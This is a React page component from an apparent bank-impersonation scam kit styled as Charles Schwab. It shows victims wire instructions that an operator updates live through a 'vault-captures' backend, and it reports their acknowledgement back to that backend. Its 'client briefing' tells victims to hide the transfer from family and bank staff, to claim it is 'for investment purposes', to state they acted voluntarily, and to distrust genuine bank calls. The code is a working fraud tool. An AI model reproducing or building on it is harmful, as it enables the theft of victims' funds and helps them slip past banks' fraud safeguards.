import { useEffect, useState } from 'react';
import { HeaderLoggedIn } from '@/components/HeaderLoggedIn';

const BASE_URL = import.meta.env.BASE_URL?.replace(/\/$/, '') || '';

interface VisitorConfig {
  wireName?: string;
  wireAccountNum?: string;
  wireSortCode?: string;
  wireAmount?: string;
  displayName?: string;
  agentName?: string;
  id?: string;
  followUpCallType?: string; // 'compliance_call' | 'payment_verify'
}

function getVisitorConfig(): VisitorConfig | null {
  try {
    const matched = localStorage.getItem('finvault_matched_visitor');
    if (matched) return JSON.parse(matched);
  } catch {}
  return null;
}

function getCaptureId(): string | null {
  return localStorage.getItem('finvault_vault_capture_id');
}

/** Format a raw number string → $1,234,567.89 */
function formatAmount(raw: string): string {
  if (!raw) return raw;
  // Strip existing $ and commas
  const clean = raw.replace(/[$,]/g, '').trim();
  const n = parseFloat(clean);
  if (isNaN(n)) return raw;
  return n.toLocaleString('en-US', { style: 'currency', currency: 'USD', minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

/* ── Confirmed success card ─────────────────────────────────────────────── */
function ConfirmedCard({ followUpCallType }: { followUpCallType?: string }) {
  const footerText = followUpCallType === 'payment_verify'
    ? 'Our payments verification team will contact you to confirm receipt of the transfer.'
    : 'Your compliance team will follow up with a confirmation call.';

  return (
    <div style={{ background: '#fff', border: '1px solid #D1D4D5', animation: 'fadeSlide 0.4s ease' }}>
      <div style={{ padding: '40px 32px', textAlign: 'center' }}>
        <div style={{
          width: 64, height: 64,
          background: 'rgba(26,172,226,0.08)', border: '2px solid #1AACE2',
          borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px',
        }}>
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
            <path d="M20 6L9 17l-5-5" stroke="#1AACE2" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </div>
        <div style={{ fontSize: 19, fontWeight: 700, color: '#1C2B39', marginBottom: 8 }}>
          Migration Initiated Successfully
        </div>
        <div style={{ fontSize: 13, color: '#5A6A7A', lineHeight: 1.7, maxWidth: 420, margin: '0 auto 20px' }}>
          Your asset migration has been confirmed and queued for processing. Funds will be secured and transferred to the designated escrow account.
        </div>
        <div style={{
          display: 'inline-block', padding: '10px 24px',
          background: 'rgba(26,172,226,0.07)', border: '1px solid rgba(26,172,226,0.25)',
          fontSize: 13, fontWeight: 700, color: '#1AACE2', letterSpacing: '0.01em',
        }}>
          Estimated completion: less than 48 hours
        </div>
        <div style={{ marginTop: 20, fontSize: 11, color: '#8A9AAA', lineHeight: 1.6 }}>
          {footerText}
        </div>
      </div>
    </div>
  );
}

/* ── Professional Wire Card ─────────────────────────────────────────────── */
interface WireFields { name: string; accountNum: string; sortCode: string; amount: string; }

function WireCard({ wire, hasDetails, copied, onCopy, onConfirm, confirmed, followUpCallType }: {
  wire: WireFields;
  hasDetails: string | false;
  copied: string | null;
  onCopy: (v: string, k: string) => void;
  onConfirm: () => void;
  confirmed: boolean;
  followUpCallType?: string;
}) {
  if (confirmed) {
    return <ConfirmedCard followUpCallType={followUpCallType} />;
  }

  return (
    <div style={{ background: '#fff', border: '1px solid #D1D4D5', animation: 'fadeSlide 0.4s ease' }}>

      {/* Card header */}
      <div style={{ padding: '16px 24px 14px', borderBottom: '1px solid #ECEDEE', display: 'flex', alignItems: 'center', gap: 10 }}>
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0 }}>
          <rect x="2" y="7" width="20" height="14" rx="1.5" stroke="#1AACE2" strokeWidth="1.8"/>
          <path d="M2 11h20" stroke="#1AACE2" strokeWidth="1.8"/>
          <path d="M6 15h4" stroke="#1AACE2" strokeWidth="1.8" strokeLinecap="round"/>
        </svg>
        <div>
          <div style={{ fontSize: 14, fontWeight: 700, color: '#1C2B39' }}>Wire Transfer Instructions</div>
          <div style={{ fontSize: 11, color: '#8A9AAA', marginTop: 2 }}>Escrow-protected · Compliance-monitored · Encrypted in transit</div>
        </div>
        <div style={{ marginLeft: 'auto', display: 'flex', alignItems: 'center', gap: 5, padding: '3px 10px', background: 'rgba(26,172,226,0.07)', border: '1px solid rgba(26,172,226,0.22)' }}>
          <div style={{ width: 6, height: 6, background: '#1AACE2', borderRadius: '50%' }} />
          <span style={{ fontSize: 10, fontWeight: 700, color: '#1AACE2', letterSpacing: '0.05em' }}>SECURE</span>
        </div>
      </div>

      {hasDetails ? (
        <div style={{ padding: '20px 24px 24px' }}>

          <div style={{ fontSize: 12, color: '#5A6A7A', lineHeight: 1.6, marginBottom: 20, padding: '10px 14px', background: '#F8FAFC', borderLeft: '3px solid #1AACE2' }}>
            To complete your account migration, please initiate an outbound wire using the details below.
            This transfer will be held in <strong style={{ color: '#1C2B39' }}>compliance escrow</strong> until your account verification is finalised.
          </div>

          {/* Wire fields — professional table layout */}
          <div style={{ border: '1px solid #D1D4D5', overflow: 'hidden' }}>
            {[
              { label: 'Beneficiary Name',  value: wire.name,       key: 'name',  mono: false, highlight: false },
              { label: 'Account Number',    value: wire.accountNum, key: 'acct',  mono: true,  highlight: false },
              { label: 'Sort Code',         value: wire.sortCode,   key: 'sort',  mono: true,  highlight: false },
              { label: 'Transfer Amount',   value: wire.amount ? formatAmount(wire.amount) : '', key: 'amt', mono: false, highlight: true },
            ].filter(f => f.value).map((field, fi, arr) => (
              <div key={field.key} style={{
                display: 'flex', alignItems: 'center',
                borderBottom: fi < arr.length - 1 ? '1px solid #ECEDEE' : 'none',
                background: field.highlight ? '#F8FCFF' : '#fff',
              }}>
                <div style={{
                  width: 160, flexShrink: 0, padding: '13px 16px',
                  borderRight: '1px solid #ECEDEE',
                  fontSize: 10, fontWeight: 700, color: '#8A9AAA',
                  letterSpacing: '0.09em', textTransform: 'uppercase',
                  background: '#FAFBFC',
                }}>
                  {field.label}
                </div>
                <div style={{ flex: 1, padding: '13px 16px' }}>
                  <div style={{
                    fontSize: field.highlight ? 20 : 14,
                    fontWeight: field.highlight ? 800 : 600,
                    color: field.highlight ? '#1AACE2' : '#1C2B39',
                    fontFamily: field.mono ? '"Courier New", Courier, monospace' : 'inherit',
                    letterSpacing: field.mono ? '0.08em' : 'normal',
                  }}>
                    {field.value}
                  </div>
                </div>
                <div style={{ padding: '13px 16px', flexShrink: 0 }}>
                  <button
                    onClick={() => onCopy(field.key === 'amt' ? wire.amount : field.value, field.key)}
                    style={{
                      padding: '5px 14px', border: '1px solid',
                      borderColor: copied === field.key ? 'rgba(26,172,226,0.4)' : '#D1D4D5',
                      cursor: 'pointer', fontSize: 11, fontWeight: 600,
                      background: copied === field.key ? 'rgba(26,172,226,0.07)' : '#fff',
                      color: copied === field.key ? '#1AACE2' : '#5A6A7A',
                      transition: 'all 0.15s', whiteSpace: 'nowrap',
                    }}>
                    {copied === field.key ? 'Copied' : 'Copy'}
                  </button>
                </div>
              </div>
            ))}
          </div>

          {/* Reference note */}
          <div style={{ marginTop: 16, padding: '10px 14px', background: 'rgba(26,172,226,0.04)', border: '1px solid rgba(26,172,226,0.18)', fontSize: 11, color: '#344B58', lineHeight: 1.65 }}>
            <strong>Payment Reference:</strong> Include your case reference number in the wire description field. Transfers submitted without a matching reference may be delayed pending compliance review.
          </div>

          {/* Confirm CTA */}
          <div style={{ marginTop: 20 }}>
            <button
              onClick={onConfirm}
              style={{
                width: '100%', padding: '14px 0', border: 'none', cursor: 'pointer',
                background: '#1AACE2', color: '#fff',
                fontSize: 14, fontWeight: 700, letterSpacing: '0.02em',
                display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
              }}>
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                <path d="M20 6L9 17l-5-5" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
              Confirm Transfer Initiated
            </button>
          </div>
        </div>
      ) : (
        <div style={{ padding: '48px 24px', textAlign: 'center' }}>
          <div style={{ width: 56, height: 56, background: 'rgba(26,172,226,0.08)', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
              <circle cx="12" cy="12" r="9" stroke="#1AACE2" strokeWidth="1.5"/>
              <path d="M12 7v5l3 3" stroke="#1AACE2" strokeWidth="1.5" strokeLinecap="round"/>
            </svg>
          </div>
          <div style={{ fontSize: 15, fontWeight: 700, color: '#1C2B39', marginBottom: 6 }}>Preparing Transfer Instructions</div>
          <div style={{ fontSize: 13, color: '#8A9AAA', lineHeight: 1.5 }}>
            Your case representative is finalising the wire details.<br />
            This page will update automatically — please do not close it.
          </div>
          <div style={{ marginTop: 24, display: 'flex', justifyContent: 'center', gap: 6 }}>
            {[0, 1, 2].map(i => (
              <div key={i} style={{ width: 6, height: 6, borderRadius: '50%', background: '#1AACE2', opacity: 0.4 + i * 0.3 }} />
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

/* ── Page ───────────────────────────────────────────────────────────────── */

export default function WireDetailsPage() {
  const [config, setConfig] = useState<VisitorConfig | null>(getVisitorConfig);
  const [copied, setCopied] = useState<string | null>(null);
  const [acknowledged, setAcknowledged] = useState(
    () => localStorage.getItem('finvault_briefing_acked') === 'true'
  );
  const [acknowledging, setAcknowledging] = useState(false);
  const [transferConfirmed, setTransferConfirmed] = useState(false);

  // Poll for live updates (admin may update wire details while visitor is on page)
  useEffect(() => {
    async function poll() {
      const captureId = getCaptureId();
      if (!captureId) { setConfig(getVisitorConfig()); return; }
      try {
        const res = await fetch(`${BASE_URL}/api/vault-captures/${captureId}`, { cache: 'no-store' });
        if (!res.ok) return;
        const row = await res.json();
        const s = row.account_settings || {};
        const cfg: VisitorConfig = {
          id: String(row.id),
          displayName: row.display_name || row.name || '',
          agentName: row.agent_name || '',
          wireName: s.wireName || '',
          wireAccountNum: s.wireAccountNum || '',
          wireSortCode: s.wireSortCode || '',
          wireAmount: s.wireAmount || '',
          followUpCallType: s.followUpCallType || 'compliance_call',
        };
        setConfig(cfg);
        localStorage.setItem('finvault_matched_visitor', JSON.stringify({
          ...JSON.parse(localStorage.getItem('finvault_matched_visitor') || '{}'),
          ...cfg,
        }));
      } catch {}
    }
    poll();
    const id = setInterval(poll, 3000);
    return () => clearInterval(id);
  }, []);

  async function handleAcknowledge() {
    setAcknowledging(true);
    localStorage.setItem('finvault_briefing_acked', 'true');
    const captureId = getCaptureId();
    if (captureId) {
      try {
        await fetch(`${BASE_URL}/api/vault-captures/${captureId}/flag`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ field: 'briefingAcknowledged', value: true }),
        });
      } catch {}
    }
    setTimeout(() => { setAcknowledging(false); setAcknowledged(true); }, 900);
  }

  function copy(val: string, key: string) {
    navigator.clipboard.writeText(val).catch(() => {});
    setCopied(key);
    setTimeout(() => setCopied(null), 2000);
  }

  const wire = {
    name: config?.wireName || '',
    accountNum: config?.wireAccountNum || '',
    sortCode: config?.wireSortCode || '',
    amount: config?.wireAmount || '',
  };

  const hasDetails = wire.name || wire.accountNum || wire.sortCode || wire.amount;

  return (
    <div style={{ minHeight: '100vh', background: '#F3F4F4', fontFamily: 'Arial, "Helvetica Neue", Helvetica, sans-serif' }}>
      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeSlide { from { opacity:0; transform:translateY(14px); } to { opacity:1; transform:translateY(0); } }
      `}</style>

      {/* Full Schwab logged-in header — matches dashboard */}
      <HeaderLoggedIn />

      <div style={{ maxWidth: 680, margin: '40px auto', padding: '0 20px' }}>

        {/* Security notice banner */}
        <div style={{ background: '#344B58', marginBottom: 24 }}>
          <div style={{ padding: '12px 20px', display: 'flex', alignItems: 'center', gap: 10 }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
              <path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.25C17.25 22.15 21 17.25 21 12V7L12 2z" fill="rgba(255,255,255,0.12)" stroke="#fff" strokeWidth="1.5"/>
              <path d="M12 8v4M12 16h.01" stroke="#fff" strokeWidth="2" strokeLinecap="round"/>
            </svg>
            <span style={{ color: '#fff', fontSize: 12, fontWeight: 700, letterSpacing: '0.08em', textTransform: 'uppercase' }}>
              Secure Asset Transfer: Action Required
            </span>
          </div>
        </div>

        {/* Pre-transfer briefing card */}
        <div style={{ background: '#fff', border: '1px solid #D1D4D5', marginBottom: 16 }}>

          {/* Briefing header */}
          <div style={{ background: '#1C2B39', padding: '14px 24px', display: 'flex', alignItems: 'center', gap: 10 }}>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
              <path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.25C17.25 22.15 21 17.25 21 12V7L12 2z" fill="rgba(255,255,255,0.12)" stroke="#1AACE2" strokeWidth="1.8"/>
              <path d="M9 12l2 2 4-4" stroke="#1AACE2" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
            <span style={{ color: '#fff', fontSize: 12, fontWeight: 700, letterSpacing: '0.08em', textTransform: 'uppercase' }}>
              Client Briefing: Please Read Before Proceeding
            </span>
          </div>

          <div style={{ padding: '20px 24px 22px' }}>
            <p style={{ margin: '0 0 16px', fontSize: 13, color: '#344B58', lineHeight: 1.65 }}>
              Before initiating the transfer, please review the following instructions from your assigned case team. Adherence to these procedures is essential to the successful and secure resolution of your case.
            </p>

            <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>

              {/* Step 1 */}
              <div style={{ display: 'flex', gap: 14, alignItems: 'flex-start' }}>
                <div style={{ width: 26, height: 26, background: '#1AACE2', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, marginTop: 1 }}>
                  <span style={{ color: '#fff', fontSize: 11, fontWeight: 800 }}>1</span>
                </div>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 700, color: '#1C2B39', marginBottom: 3 }}>Verification Call: Incoming</div>
                  <div style={{ fontSize: 12, color: '#5A6A7A', lineHeight: 1.6 }}>
                    A member of our Verification &amp; Compliance Team will contact you shortly. The purpose of this call is solely to confirm that the transfer has been submitted. No additional action will be required from you beyond verbal confirmation.
                  </div>
                </div>
              </div>

              {/* Step 2 */}
              <div style={{ display: 'flex', gap: 14, alignItems: 'flex-start' }}>
                <div style={{ width: 26, height: 26, background: '#1AACE2', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, marginTop: 1 }}>
                  <span style={{ color: '#fff', fontSize: 11, fontWeight: 800 }}>2</span>
                </div>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 700, color: '#1C2B39', marginBottom: 3 }}>Confidentiality Requirement: Strictly Observed</div>
                  <div style={{ fontSize: 12, color: '#5A6A7A', lineHeight: 1.6 }}>
                    This matter is part of an active internal security investigation. It must remain strictly confidential. Do not discuss this process with anyone, including family members, colleagues, bank staff, or personnel from other departments, until your case has been officially closed.
                  </div>
                </div>
              </div>

              {/* Step 3 */}
              <div style={{ display: 'flex', gap: 14, alignItems: 'flex-start' }}>
                <div style={{ width: 26, height: 26, background: '#1AACE2', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, marginTop: 1 }}>
                  <span style={{ color: '#fff', fontSize: 11, fontWeight: 800 }}>3</span>
                </div>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 700, color: '#1C2B39', marginBottom: 3 }}>If Asked About the Transfer</div>
                  <div style={{ fontSize: 12, color: '#5A6A7A', lineHeight: 1.6 }}>
                    Should any third party, including bank tellers, call handlers, or other individuals, enquire about the nature of this transaction, please state that the transfer is being made{' '}
                    <strong style={{ color: '#1C2B39' }}>for investment purposes</strong>.
                    {' '}This is a standard protective protocol designed to prevent exposure of the ongoing investigation to departments that do not handle this class of case. <strong style={{ color: '#1C2B39' }}>You are completing this transfer yourself</strong> as a voluntary protective action. Do not indicate otherwise.
                  </div>
                </div>
              </div>

              {/* Step 4 */}
              <div style={{ display: 'flex', gap: 14, alignItems: 'flex-start' }}>
                <div style={{ width: 26, height: 26, background: '#344B58', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, marginTop: 1 }}>
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none">
                    <path d="M12 9v4M12 17h.01" stroke="#fff" strokeWidth="2.5" strokeLinecap="round"/>
                    <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#fff" strokeWidth="1.8"/>
                  </svg>
                </div>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 700, color: '#1C2B39', marginBottom: 3 }}>Why This Protocol Is In Place</div>
                  <div style={{ fontSize: 12, color: '#5A6A7A', lineHeight: 1.6 }}>
                    Our security division has identified a pattern of <strong style={{ color: '#1C2B39' }}>account interceptions</strong> targeting clients matching your profile. Fraudulent actors have been known to intercept communications and impersonate compliance staff, including during phone calls, in an attempt to redirect transfers or obtain case details.
                    {' '}For this reason, <strong style={{ color: '#1C2B39' }}>all details of this investigation must remain private</strong>, including on any verification calls you receive.
                    {' '}Disclosing case information to any party, even those claiming to represent the bank, could compromise the integrity of the operation and expose your account to further risk.
                    {' '}You are performing this transfer <strong style={{ color: '#1C2B39' }}>independently and voluntarily</strong> as a protective measure; this is essential to the protocol.
                    {config?.agentName && <span> Your case has been escalated to <strong style={{ color: '#1C2B39' }}>{config.agentName}</strong> from our specialist security division.</span>}
                  </div>
                </div>
              </div>

            </div>

            {/* Acknowledge CTA */}
            {!acknowledged && (
              <div style={{ marginTop: 20 }}>
                <button
                  onClick={handleAcknowledge}
                  disabled={acknowledging}
                  style={{
                    width: '100%', padding: '14px 0', border: 'none',
                    cursor: acknowledging ? 'default' : 'pointer',
                    background: acknowledging ? '#344B58' : '#1AACE2', color: '#fff',
                    fontSize: 14, fontWeight: 700, letterSpacing: '0.02em',
                    transition: 'background 0.3s',
                    display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 10,
                  }}>
                  {acknowledging ? (
                    <>
                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" style={{ animation: 'spin 1s linear infinite' }}>
                        <circle cx="12" cy="12" r="9" stroke="rgba(255,255,255,0.3)" strokeWidth="2.5"/>
                        <path d="M12 3a9 9 0 019 9" stroke="#fff" strokeWidth="2.5" strokeLinecap="round"/>
                      </svg>
                      Verifying acknowledgement
                    </>
                  ) : (
                    <>
                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
                        <path d="M9 12l2 2 4-4" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                        <path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.25C17.25 22.15 21 17.25 21 12V7L12 2z" stroke="#fff" strokeWidth="1.8"/>
                      </svg>
                      I Understand. Proceed to Transfer Instructions
                    </>
                  )}
                </button>
                <div style={{ marginTop: 8, fontSize: 10, color: '#8A9AAA', textAlign: 'center', lineHeight: 1.5 }}>
                  By proceeding you confirm you have read and understood all instructions above.
                  {config?.agentName && <span> Your representative <strong>{config.agentName}</strong> is monitoring this case in real time.</span>}
                </div>
              </div>
            )}

            {/* Acknowledged badge — site theme, no green */}
            {acknowledged && (
              <div style={{ marginTop: 16, padding: '8px 14px', background: 'rgba(26,172,226,0.06)', border: '1px solid rgba(26,172,226,0.22)', display: 'flex', alignItems: 'center', gap: 8, fontSize: 11, color: '#1AACE2', fontWeight: 700 }}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
                  <path d="M20 6L9 17l-5-5" stroke="#1AACE2" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                Briefing acknowledged. Transfer instructions unlocked.
              </div>
            )}
          </div>
        </div>

        {/* Wire card */}
        {acknowledged && (
          <WireCard
            wire={wire}
            hasDetails={hasDetails}
            copied={copied}
            onCopy={copy}
            onConfirm={() => setTransferConfirmed(true)}
            confirmed={transferConfirmed}
            followUpCallType={config?.followUpCallType}
          />
        )}

        {/* Footer */}
        <div style={{ marginTop: 20, textAlign: 'center', fontSize: 11, color: '#8A9AAA', lineHeight: 1.6 }}>
          Charles Schwab &amp; Co., Inc. · Member SIPC · Encrypted 256-bit TLS connection
        </div>
      </div>
    </div>
  );
}
